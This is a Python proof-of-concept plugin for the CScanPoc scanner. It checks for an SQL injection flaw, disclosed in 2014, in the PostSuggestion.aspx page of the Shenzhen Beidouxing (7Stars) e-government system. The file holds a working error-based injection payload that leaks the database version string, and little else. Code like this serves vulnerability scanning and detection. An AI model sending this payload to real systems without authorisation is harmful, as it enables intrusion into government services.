# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = '7Stars_0000' # 平台漏洞编号，留空
    name = '深圳北斗星电子政务系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-21'  # 漏洞公布时间
    desc = '''
       深圳北斗星电子政务系统 /sssweb/SuggestionCollection/PostSuggestion.aspx?ID= SQL注入漏洞。
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=076736
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '7Stars(深圳北斗星)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '06a34c8f-e865-4fe9-9ad1-75b5230906d4'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1%27+and+1=char(73)%2Bchar(73)%2Bchar(73)%2B@@version+and+%27a%27=%27a"
            code,head,res,errcode,_=hh.http(url)   
            if code==500 and 'IIIMicrosoft' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()